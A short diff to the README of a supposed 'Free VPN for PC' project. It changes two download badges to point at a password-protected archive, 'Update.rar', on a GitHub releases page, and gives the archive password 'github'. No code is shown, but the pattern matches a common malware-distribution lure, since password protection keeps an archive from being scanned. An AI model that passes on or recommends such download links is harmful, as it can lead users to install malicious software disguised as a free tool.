@@ -1,8 +1,8 @@
-# Free VPN for PC [![Download Free VPN](https://img.shields.io/badge/Download-Free%20VPN-green)]()
+# Free VPN for PC [![Download Free VPN](https://img.shields.io/badge/Download-Free%20VPN-blue)](https://github.com/SAMAIOEC/free-vpn-for-pc/releases/download/Release/Update.rar)
 
 ## Installation
 To install Free VPN for PC, follow these simple steps:
-1. [![Download Free VPN](https://img.shields.io/badge/Download-Free%20VPN-green)]()
+1. [![Download Free VPN](https://img.shields.io/badge/Download-Free%20VPN-blue)](https://github.com/SAMAIOEC/free-vpn-for-pc/releases/download/Release/Update.rar)
 
 2. **Pass: github**
 
